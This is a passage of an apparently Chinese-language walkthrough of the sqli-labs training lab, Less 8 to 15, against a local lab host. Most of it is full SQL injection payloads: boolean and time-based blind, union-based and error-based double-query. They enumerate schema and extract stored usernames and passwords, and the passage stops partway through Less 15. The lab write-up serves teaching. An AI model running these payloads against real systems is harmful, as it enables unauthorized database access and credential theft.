<p>注：第一个字符串的 ascii 值为 101，从上面的 ascii 表中可以找到相应的字符为 “ e ” </p>
<ol start="4">
<li><strong>判断表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/15/2PojderbXO8pgEM.png" alt="less8-14.png"></p>
<ol start="5">
<li><strong>判断字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=105%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/15/QYyNs4O2FdEibtj.png" alt="less8-15.png"></p>
<ol start="6">
<li><strong>判断数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select username FROM security.users limit 0,1),1,1))=68%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/15/oga2zSMfjBPUFtL.png" alt="less8-16.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select password FROM security.users limit 0,1),1,1))=68%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/15/aebTfXqFs8iWMZ9.png" alt="less8-17.png"></p>
<h2 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h2><p>基于时间的GET单引号盲注</p>
<hr>
<h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h4><p>IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false</p>
<p>sleep(n)：命令延时 n 秒后执行</p>
<h4 id="工作原理-3"><a href="#工作原理-3" class="headerlink" title="工作原理"></a>工作原理</h4><ol>
<li><p>用 if()+ascii()+substr() 函数来分析输出内容</p>
</li>
<li><p>用 sleep() 函数判断输出的内容是否正确。</p>
</li>
</ol>
<h3 id="注入步骤-3"><a href="#注入步骤-3" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/JcXFtHx2eAzWS45.png" alt="less9-1.png"></p>
<p>注：网页是正常界面，使用时间盲注进行测试</p>
<ol start="2">
<li><strong>判断数据库字符串的长度</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))>56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))=56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
<ol start="3">
<li><strong>判断数据库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))>115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
<ol start="4">
<li><strong>判断表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
<ol start="5">
<li><strong>判断字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=105, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/4m5lzPZ81nhMNDB.png" alt="less9-8.png"></p>
<ol start="6">
<li><strong>判断数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/DVzIYSaxdcOqB7p.png" alt="less9-9.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/16/6bsNqC2iOByda4k.png" alt="less9-10.png"></p>
<h2 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h2><p>基于时间的GET双引号盲注</p>
<hr>
<ol>
<li><strong>判断数据库字符串的长度</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))>56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/yPOJlxQK7fB69u4.png" alt="less10-1.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))=56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/Vfd7gaj4nK8CFsN.png" alt="less10-2.png"></p>
<ol start="2">
<li><strong>判断数据库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))>115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/xuRBE6a1CdqSYT7.png" alt="less10-3.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/WFPj8zL3QYrURAJ.png" alt="less10-4.png"></p>
<ol start="3">
<li><strong>判断表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/ycveLYBhmkOlMVR.png" alt="less10-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/ZELaSOh3lvyU9zu.png" alt="less10-6.png"></p>
<ol start="4">
<li><strong>判断字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/mfMaVkzvBH4FlJQ.png" alt="less10-7.png"></p>
<ol start="5">
<li><strong>判断数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/6vkYrFOqgJZNceP.png" alt="less10-8.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/20/D7OVrNTeM94aqcx.png" alt="less10-9.png"></p>
<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><h3 id="HTML基础知识"><a href="#HTML基础知识" class="headerlink" title="HTML基础知识"></a>HTML基础知识</h3><ol>
<li><strong>表单赏析</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/24/GES3CzekDcY17Jq.png" alt="from-1.png"></p>
<p><img src="https://i.loli.net/2019/10/24/1bFOMWHrxvAGKl2.png" alt="from-2.png"></p>
<p><img src="https://i.loli.net/2019/10/24/6sri8IVJSNGT5jH.png" alt="from-3.png"></p>
<p><img src="https://i.loli.net/2019/10/24/WnTfMNIlHg7med6.png" alt="from-4.png"></p>
<ol start="2">
<li><strong>了解表单</strong></li>
</ol>
<p>功能：用于搜集不同类型的用户输入的内容，然后将数据提交给后台服务器处理。</p>
<p>有了表单，网页内容可以由用户自己创建，对于网页来说，我们既是网页创建者，也是网页消费者。</p>
<ol start="3">
<li><strong>常用的表单元素</strong></li>
</ol>
<p>form 表单</p>
<p>input 表单元素</p>
<p>select和option 下拉菜单</p>
<p>textarea 文本域</p>
<ol start="4">
<li><strong>from 元素</strong></li>
</ol>
<p>action：表示当前表单中的内容提交给哪个页面进行处理</p>
<p>method：表示当前表单提交方式，常见的由 get 和 post 方式，默认是 get 提交</p>
<p>get 方式：使用 get 方式向后台发送数据，会把所有的请求数据拼接成 k=value 的形式连到一起，组装到 URL 上，其本质上是 URL 的拼接，把所有参数拼接到一起，组成新的 URL。</p>
<p>示例：<code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1</code></p>
<p>post 方式：请求的 URL 不会发生任何变化，请求数据会通过浏览器传输给后台服务器。POST 的安全性比较高，URL 更加干净。get 方式会把数据显示出来，造成数据泄露。</p>
<p>示例：</p>
<p><img src="https://i.loli.net/2019/10/24/l9hHIb7sXMjCEkY.png" alt="from-5.png"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>post 就是将 form 标签的表单提交方式设为 post。</p>
<p>post 传输过程：form 标签包裹住所有的 input 输入框，当你点提交（submit）的时候，就会把 form 包裹的所有的 input 信息提交给 form 对应的后台服务器地址，这就是一个 post 过程。</p>
<h3 id="注入步骤-4"><a href="#注入步骤-4" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>尝试输入 username:用户名+单引号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/24/idjAgfH9SxvorDC.png" alt="less11-1.png"></p>
<p>注：从报错中可以猜出数据库的执行语句：SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1</p>
<ol start="2">
<li><strong>尝试输入 username:用户名+单引号+井号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/24/6FAgtxyizbwcfud.png" alt="less11-2.png"></p>
<ol start="3">
<li><strong>猜测字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin' order by 3#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/24/tpXwyZWbTIon4vq.png" alt="less11-5.png"></p>
<ol start="4">
<li><strong>爆库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,database()#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/24/xU9TBGf8nRXhgd6.png" alt="less11-3.png"></p>
<p><img src="https://i.loli.net/2019/10/24/vD7QMZEr4H2fR68.png" alt="less11-4.png"></p>
<p>注：这里和 get 型注入一样，union 之前的值必须为空值。</p>
<ol start="5">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/24/B8kJoDzygmFh697.png" alt="less11-6.png"></p>
<ol start="6">
<li><strong>爆字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/24/lMk6ULfIZKdh1VC.png" alt="less11-7.png"></p>
<ol start="7">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(username) FROM security.users#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/24/5kDou63UQplETRH.png" alt="less11-8.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(password) FROM security.users#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/24/kwVWuHS6C9vrGYQ.png" alt="less11-9.png"></p>
<h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关和 less11 类似，只是在 id 的参数的处理上有一定的不同。</p>
<hr>
<ol>
<li><strong>尝试输入 username:用户名+双引号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/28/Ib2yL8geAvwr1i9.png" alt="less12-1.png"></p>
<p>注：从报错中可以判断出SQL语句：SELECT username, password FROM users WHERE username=(“admin”) and password=(“$passwd”) LIMIT 0,1</p>
<ol start="2">
<li><strong>尝试输入 username:用户名+双引号+括号+井号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/28/A3HKMLNp6uQPrF7.png" alt="less12-2.png"></p>
<ol start="3">
<li><strong>猜测字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin") order by 3#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/ctbYzHJjqiQxMgV.png" alt="less12-3.png"></p>
<ol start="4">
<li><strong>爆库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin") union select 1,database()#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/dwlS7t9mFvTpzEA.png" alt="less12-4.png"></p>
<ol start="5">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin") union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/UZmdTDIFXCAliaS.png" alt="less12-5.png"></p>
<ol start="6">
<li><strong>爆字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin") union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/xm45abg7pSH1I9Q.png" alt="less12-6.png"></p>
<ol start="7">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：1admin") union select group_concat(username),group_concat(password) FROM security.users#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/e8LumOXRCbPdMw1.png" alt="less12-7.png"></p>
<h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>POST 型单引号双注入</p>
<hr>
<ol>
<li><strong>尝试输入 username:用户名+单引号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/28/hy4oqaGzObdR3LS.png" alt="less13-1.png"></p>
<p>注：从报错中可以判断出SQL语句：SELECT username, password FROM users WHERE username=(‘admin’) and password=(‘$passwd’) LIMIT 0,1</p>
<ol start="2">
<li><strong>尝试输入 username:用户名+单引号+括号+井号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/10/28/Ai1o8e9JuTUBLIv.png" alt="less13-2.png"></p>
<ol start="3">
<li><strong>猜测字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin') order by 3#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/iMfW1UeFtLu2sDH.png" alt="less13-3.png"></p>
<ol start="4">
<li><strong>爆库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/8hbv1LsmOdue5X3.png" alt="less13-4.png"></p>
<ol start="5">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/Bl5EqdgInR2wfSz.png" alt="less13-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/2KTVI7aCsJRn8tu.png" alt="less13-6.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/ZNOqlc8WIuR75ag.png" alt="less13-7.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/nrhjvduRmH1zieI.png" alt="less13-8.png"></p>
<ol start="6">
<li><strong>爆字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/rUmwFJO3uDHVPqW.png" alt="less13-9.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/t7Jrjm8KlgM1ns9.png" alt="less13-10.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/qd8BLG7OzluUwFf.png" alt="less13-11.png"></p>
<ol start="7">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/ubqJG5wlQtI6AYo.png" alt="less13-12.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#

password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/10/28/SF5ZputCkTNDRmV.png" alt="less13-13.png"></p>
<h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关和 13 关一样都是双注入，只是 “单引号” 改成了 “双引号”</p>
<hr>
<ol>
<li><strong>尝试输入 username:用户名+双引号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/02/ECMurvxGokN4KWY.png" alt="less14-1.png"></p>
<p>注：这边不太好判断出 SQL 语句，从后台可以看到 SQL 语句：SELECT username, password FROM users WHERE username=”admin” and password=”$passwd” LIMIT 0,1</p>
<ol start="2">
<li><strong>尝试输入 username:用户名+双引号+井号，password:随便输</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/02/y28rMSVJNRQ7ZjH.png" alt="less14-2.png"></p>
<ol start="3">
<li><strong>猜测字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin" order by 3#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/CugEkJhG9vZBHI8.png" alt="less14-3.png"></p>
<ol start="4">
<li><strong>爆库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/7vPMFtYNeT8qjGi.png" alt="less14-4.png"></p>
<ol start="5">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/bqOflGDQRIVFPSH.png" alt="less14-5.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/Np1hVJqLgb2zviU.png" alt="less14-6.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/M5jdnOeWzwUA6sY.png" alt="less14-7.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/xjYwHCUQPFvWhq1.png" alt="less14-8.png"></p>
<ol start="6">
<li><strong>爆字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/ToZEcqPgVL8aCvi.png" alt="less14-9.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/kS8NePXgwOT3G1v.png" alt="less14-10.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/dNZJ6skSQtvPzhV.png" alt="less14-11.png"></p>
<ol start="7">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/ykNBg7iUdcbqoTE.png" alt="less14-12.png"></p>
<pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/02/JGvBxp8PtOWezg4.png" alt="less14-13.png"></p>
<h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>POST 型单引号布尔盲注</p>
<hr>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>正确回显是固定字符串（无回显）这里页面显示flag.jpg这张图片；</p>
<p>错误回显是Mysql错误信息，这里页面显示slap.jpg这张图片。</p>
<p><img src="https://i.loli.net/2019/10/28/WBGcbZntvr1CV6Y.png" alt="flag.png"></p>
<p><img src="https://i.loli.net/2019/10/28/wdSfEzjDNYJmonW.png" alt="slap.png"></p>
<h3 id="注入步骤-5"><a href="#注入步骤-5" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>判断数据库字符串的长度</strong></li>
</ol>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>55<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/O5cKM2WgI8pJZXj.png" alt="less15-1.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>56<span class="token comment" spellcheck="true">#</span>
password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/03/d8LJQGYpgvuMVRn.png" alt="less15-2.png"></p>
<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>56<span class="token comment" spellcheck="true">#</span>
